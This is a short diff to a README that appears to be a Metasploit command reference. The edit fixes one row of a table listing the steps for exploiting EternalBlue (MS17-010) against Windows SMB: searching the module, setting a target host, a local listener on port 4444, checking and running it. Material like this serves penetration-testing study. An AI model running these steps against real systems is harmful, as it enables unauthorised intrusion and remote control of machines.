@@ -145,7 +145,7 @@ A metasploit dictionary from beginner level the advanced level including most of
 |msfconsole -d |     start Metasploit with database support|
 |workspace target1|        Create a new workspace|
 |search eternalblue |      Search for an exploit|
-|use||exploit/windows/smb/ms17_010_eternalblue|            # See what needs to be set|
+|exploit/windows/smb/ms17_010_eternalblue|            # See what needs to be set|
 |set RHOSTS 192.168.1.10 / set LHOST 192.168.1.5|   # Your IP set LPORT 4444|
 |check |                  # See if it's vulnerable|
 |run |                    # Run the exploit|
